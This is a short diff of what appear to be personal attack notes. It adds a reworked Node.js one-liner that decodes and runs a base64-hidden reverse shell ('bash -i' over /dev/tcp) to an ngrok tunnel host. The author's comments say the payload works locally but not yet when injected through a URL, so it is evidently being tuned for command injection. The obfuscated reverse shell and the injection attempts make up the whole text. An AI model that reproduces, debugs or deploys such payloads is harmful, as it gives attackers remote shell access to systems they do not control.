@@ -49,5 +49,9 @@ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' |bas
 
 
 node -e "require('child_process').execSync('bash -c \"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' |base64 -d|bash\"', {stdio:[0,1,2]});"
+make some escape charcter addtion
+node -e "require('child_process').execSync(\"bash -c 'echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' | base64 -d | bash'\", {stdio:[0,1,2]});"
+
+still not working in url ,but working locally
 
 ```
